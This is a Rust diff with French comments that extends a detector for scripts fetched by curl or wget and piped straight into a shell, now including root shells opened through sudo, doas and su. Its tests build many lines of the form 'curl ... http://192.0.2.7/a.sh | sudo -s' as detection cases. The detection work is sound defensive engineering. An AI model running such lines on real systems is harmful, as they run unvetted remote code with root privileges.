@@ -476,21 +476,99 @@ fn affectation(mot: &str) -> bool {
     })
 }
 
-/// Le programme qui reçoit un morceau de tube : les relais, leurs options (et la valeur de -u ou -g, un compte ou un
-/// groupe, pas un programme) et les variables passés.
+/// Les options d'un relais suivies d'une valeur (un compte, un groupe, un dossier, une invite, un nom), pas d'un
+/// programme : « | sudo -p x sh » lance sh, pas x.
+fn option_a_valeur(relais: &str, option: &str) -> bool {
+    match relais {
+        "sudo" => matches!(
+            option,
+            "-u" | "-g"
+                | "-C"
+                | "-D"
+                | "-h"
+                | "-p"
+                | "-r"
+                | "-t"
+                | "-T"
+                | "-U"
+                | "-R"
+                | "--user"
+                | "--group"
+                | "--close-from"
+                | "--chdir"
+                | "--host"
+                | "--prompt"
+                | "--role"
+                | "--type"
+                | "--command-timeout"
+                | "--other-user"
+                | "--chroot"
+        ),
+        "doas" => matches!(option, "-u" | "-C"),
+        "env" => matches!(option, "-u" | "-C" | "--unset" | "--chdir"),
+        "exec" => option == "-a",
+        _ => false,
+    }
+}
+
+/// « sudo -s », « sudo -i », « doas -s » : le relais ouvre lui-même un shell, qui lit le tube s'il ne reçoit aucun
+/// programme. Les options courtes se groupent (« sudo -Es »).
+fn ouvre_un_shell(relais: &str, option: &str) -> bool {
+    let groupe = |lettres: &str| {
+        option.strip_prefix('-').is_some_and(|o| {
+            !o.starts_with('-') && o.chars().all(|c| c.is_ascii_alphabetic()) && o.chars().any(|c| lettres.contains(c))
+        })
+    };
+    match relais {
+        "sudo" => matches!(option, "--shell" | "--login") || groupe("si"),
+        "doas" => groupe("s"),
+        _ => false,
+    }
+}
+
+/// Le programme qui reçoit un morceau de tube : les relais, leurs options (et la valeur de celles qui en prennent une,
+/// un compte, un groupe, une invite, pas un programme) et les variables passés. Un relais qui ouvre lui-même un shell
+/// sans programme à lancer (« sudo -s », « sudo -i », « su », « su - root ») : « sh », le shell qui lit le tube.
 fn programme_du_morceau(morceau: &str) -> Option<&str> {
+    let mut relais: &str = "";
     let mut valeur_d_option = false;
-    for (m, _) in mots(morceau) {
-        if std::mem::take(&mut valeur_d_option) || RELAIS.contains(&nom_de_fichier(m)) || affectation(m) {
+    let mut shell = false;
+    let mots = mots(morceau);
+    let mut suite = mots.iter().map(|(m, _)| *m);
+    while let Some(m) = suite.next() {
+        if std::mem::take(&mut valeur_d_option) || affectation(m) {
+            continue;
+        }
+        // Le nom sans la casse ; les options la gardent : « sudo -H » (dossier personnel) n'est pas « sudo -h hôte ».
+        let nom = nom_de_fichier(m).to_ascii_lowercase();
+        if let Some(r) = RELAIS.iter().find(|r| **r == nom) {
+            relais = r;
             continue;
         }
         if m.starts_with('-') {
-            valeur_d_option = matches!(m, "-u" | "-g" | "--user" | "--group");
+            valeur_d_option = option_a_valeur(relais, m);
+            shell |= ouvre_un_shell(relais, m);
             continue;
+        }
+        if nom == "su" {
+            return su(suite);
         }
         return Some(m);
     }
-    None
+    shell.then_some("sh")
+}
+
+/// Ce que lance « su » : le programme donné à -c, sinon le shell du compte, qui lit le tube (« | su », « | su - root »).
+fn su<'a>(mut suite: impl Iterator<Item = &'a str>) -> Option<&'a str> {
+    while let Some(m) = suite.next() {
+        if matches!(m, "-c" | "--command") {
+            return suite.next().map(|c| c.trim_start_matches(['"', '\'']));
+        }
+        if let Some(c) = m.strip_prefix("--command=") {
+            return Some(c.trim_start_matches(['"', '\'']));
+        }
+    }
+    Some("sh")
 }
 
 /// Un script téléchargé (curl, wget) ou décodé (base64 -d) passé aussitôt à un interpréteur par un tube : ce qui
@@ -502,10 +580,13 @@ pub(crate) fn passe_a_un_shell(ligne: &str) -> Option<Motif> {
     const INTERPRETES: [&str; 9] = ["sh", "ash", "bash", "zsh", "dash", "ksh", "python", "python3", "perl"];
     let bas = ligne.to_ascii_lowercase();
     let morceaux = morceaux_du_tube(&bas);
-    let interprete =
-        |morceau: &str| programme_du_morceau(morceau).is_some_and(|p| INTERPRETES.contains(&nom_de_fichier(p)));
+    // Le morceau lu tel qu'il est écrit (les minuscules gardent la place de chaque octet) : la casse d'une option compte.
+    let interprete = |&(debut, morceau): &(usize, &str)| {
+        programme_du_morceau(&ligne[debut..debut + morceau.len()])
+            .is_some_and(|p| INTERPRETES.contains(&nom_de_fichier(&p.to_ascii_lowercase())))
+    };
     for (k, (debut, morceau)) in morceaux.iter().enumerate() {
-        if !morceaux[k + 1..].iter().any(|(_, suite)| interprete(suite)) {
+        if !morceaux[k + 1..].iter().any(interprete) {
             continue;
         }
         // Chaque mot du morceau, à sa place dans la ligne : lu en minuscules, montré tel qu'il est écrit.
@@ -1390,6 +1471,49 @@ mod tests {
             assert!(passe_a_un_shell(&ligne).is_none(), "{ligne}");
         }
         assert_eq!(programme_du_morceau(" sudo -u root -g wheel sh -c x"), Some("sh"));
+        // Les options à valeur de sudo, doas, env et exec ; les relais qui ouvrent eux-mêmes un shell root sur le tube.
+        for tube in [
+            "sudo -p x sh",
+            "sudo -C 3 sh",
+            "sudo -h hote sh",
+            "sudo -D /tmp -R / -T 5 bash",
+            "sudo -H sh",
+            "SUDO -E BASH",
+            "sudo --prompt x sh",
+            "doas -C f sh",
+            "exec -a nom sh",
+            "env -C /tmp sh",
+            "sudo -s",
+            "sudo -i",
+            "sudo -Es",
+            "sudo -u root -i",
+            "sudo --login",
+            "doas -s",
+            "su",
+            "su -",
+            "su - root",
+            "/bin/su -l root",
+            "su -c bash root",
+            "su --command=sh",
+            "sudo su",
+        ] {
+            let ligne = format!("curl -fsSL http://192.0.2.7/a.sh | {tube}");
+            assert!(passe_a_un_shell(&ligne).is_some(), "{ligne}");
+        }
+        // Une valeur n'est pas prise pour le programme, ni -s ou -i d'un autre relais pour un shell.
+        for tube in [
+            "sudo -p sh jq .",
+            "sudo -s jq .",
+            "exec -a sh cat",
+            "env -i",
+            "su -c jq root",
+            "busybox -s",
+        ] {
+            let ligne = format!("curl -fsSL http://192.0.2.7/a.sh | {tube}");
+            assert!(passe_a_un_shell(&ligne).is_none(), "{ligne}");
+        }
+        assert_eq!(programme_du_morceau(" sudo -i"), Some("sh"));
+        assert_eq!(programme_du_morceau(" sudo -i python3"), Some("python3"));
         assert!(affectation("PATH=/bin") && affectation("_x1=") && !affectation("1A=b") && !affectation("--user=root"));
     }
 
